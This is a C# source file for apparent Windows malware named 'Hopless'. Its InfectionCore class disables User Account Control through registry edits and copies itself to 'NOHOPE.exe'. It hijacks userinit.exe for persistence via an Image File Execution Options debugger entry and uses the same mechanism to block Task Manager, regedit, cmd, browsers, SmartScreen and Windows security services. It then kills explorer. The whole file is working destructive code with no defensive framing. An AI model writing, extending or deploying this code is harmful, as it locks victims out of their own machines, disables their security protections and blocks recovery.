using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Diagnostics;

namespace Hopless
{
    internal class InfectionCore
    {
        public static void Infection()
        {
            
            Program.infection = true;
            Regedit.RegistryLM(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0);
            Regedit.RegistryLM(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "FilterAdministratorToken", 1);
            Regedit.RegistryLM(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", "ConsentPromptBehaviorAdmin", 0);
            
            if (!Directory.Exists(@"C:\Program Files\Temp"))
            {
                Directory.CreateDirectory(@"C:\Program Files\Temp");
            }
            File.Copy(Application.ExecutablePath, @"C:\Program Files\Temp\NOHOPE.exe");
            Regedit.RegistryLM(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + "userinit.exe", "Debugger", @"C:\Program Files\Temp\NOHOPE.exe");
            IFEO();

            Process[] explorer = Process.GetProcessesByName("explorer");
            explorer[0].Kill();
            
            
        }

        public static void IFEO()
        {
            string[] programs = { "msconfig.exe", "tasklist.exe", "taskmgr.exe", "mmc.exe", "explorer.exe", "regedit.exe", "chrome.exe", "msedge.exe", "iexplore.exe", "taskkill.exe", "cmd.exe",
            "SecurityHealthService.exe", "smartscreen.exe" };

            foreach (string program in programs)
            {
                Regedit.RegistryLM(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\" + program, "Debugger", "NO MORE HOPE");
            }
        }
    }
}
